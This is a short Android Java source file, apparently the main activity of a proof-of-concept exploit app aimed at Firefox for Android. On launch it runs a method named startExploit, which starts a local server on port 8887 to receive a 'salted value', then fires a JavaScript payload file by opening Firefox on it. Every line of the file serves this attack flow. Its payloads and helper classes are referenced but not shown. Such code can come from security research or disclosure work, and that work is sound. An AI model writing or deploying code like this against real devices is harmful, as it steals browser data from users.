package com.example.ffoxnew;

import java.net.UnknownHostException;

import com.example.ffoxnew.Utils.SymLinks;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
	
	private static final String TAG = MainActivity.class.getSimpleName();

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		try {
			startExploit();
		} catch (Exception e) {
			// Collecting all the errors in one place
			Log.e(TAG, e.getMessage());
			e.printStackTrace();
			finish();
		}
	}
	
	@Override
	protected void onDestroy() {
		super.onDestroy();
		FFoxApplication app = (FFoxApplication) getApplication();
		app.cleanup();
	}
	
	private void startExploit() throws UnknownHostException, InterruptedException {
		// starting the server to receive the salted value
		ContentReceiverServer server = new ContentReceiverServer(8887, this);
		server.start();
		// Firing the first payload
		String firstPayloadPath = JSPayloads.getPathForPayload(this, JSPayloads.FIRST_PAYLOAD);
		Utils.Firefox.launch(this, firstPayloadPath);
	}

}
